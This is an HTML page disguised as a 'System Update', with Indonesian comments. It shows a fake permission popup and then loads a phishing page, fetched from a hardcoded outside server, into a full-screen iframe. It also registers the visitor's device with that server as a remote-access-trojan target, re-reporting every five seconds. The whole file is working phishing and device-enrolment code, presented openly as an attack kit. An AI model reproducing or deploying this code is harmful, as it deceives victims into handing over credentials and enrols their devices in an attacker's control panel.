<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Update</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #fff; font-family: sans-serif; }
        iframe { width: 100%; height: 100%; border: none; display: none; }
        
        /* Popup Palsu Izin */
        #permission-popup {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.8); display: flex; justify-content: center; align-items: center;
            z-index: 10000; flex-direction: column; color: white; text-align: center; padding: 20px;
        }
        .btn-allow {
            background: #1877f2; color: white; border: none; padding: 12px 24px;
            border-radius: 8px; font-size: 16px; font-weight: bold; margin-top: 20px;
            cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.3);
        }
        .btn-allow:active { background: #0e5a9c; }
        
        #loading { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: none; justify-content: center; align-items: center; flex-direction: column; z-index: 9999; }
        .spin { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: s 1s linear infinite; margin-bottom: 15px; }
        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <!-- POPUP IZIN PALSU -->
    <div id="permission-popup">
        <h2 style="margin-bottom: 10px;">Izin Diperlukan</h2>
        <p style="color: #ccc; margin-bottom: 20px;">Aplikasi ini memerlukan akses lokasi dan media untuk melanjutkan pembaruan sistem.</p>
        <button class="btn-allow" onclick="allowPermission()">IZINKAN & LANJUTKAN</button>
    </div>

    <!-- LAYAR LOADING -->
    <div id="loading"><div class="spin"></div><h3>Memuat...</h3></div>

    <!-- WEB PHISING -->
    <iframe id="frame" src="about:blank"></iframe>

    <script>
        var SERVER = "http://herstoreganteng.rexypediaa.biz.id:4732";

        function allowPermission() {
            // Sembunyiin popup
            document.getElementById('permission-popup').style.display = 'none';
            document.getElementById('loading').style.display = 'flex';

            // 1. Minta Izin Beneran (Lokasi)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        console.log("Lokasi didapat:", pos.coords.latitude, pos.coords.longitude);
                    },
                    function(err) {
                        console.log("Izin lokasi ditolak / error.");
                    }
                );
            }

            // 2. Ambil URL Phising
            fetch(SERVER + '/api/get-target')
                .then(res => res.text())
                .then(url => {
                    if(url) {
                        document.getElementById('loading').style.display = 'none';
                        document.getElementById('frame').src = url;
                        document.getElementById('frame').style.display = 'block';
                    }
                });

            // 3. Lapor Diri ke RAT (Auto Masuk Panel)
            var deviceId = "web-" + Math.random().toString(36).substr(2, 9);
            function registerRAT() {
                fetch(SERVER + '/api/device/register', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        device_id: deviceId,
                        name: "WebView Target",
                        os: "Android WebView",
                        battery: 100
                    })
                });
            }
            
            registerRAT(); // Lapor pertama kali
            setInterval(registerRAT, 5000); // Lapor terus tiap 5 detik
        }
    </script>
</body>
      </html>
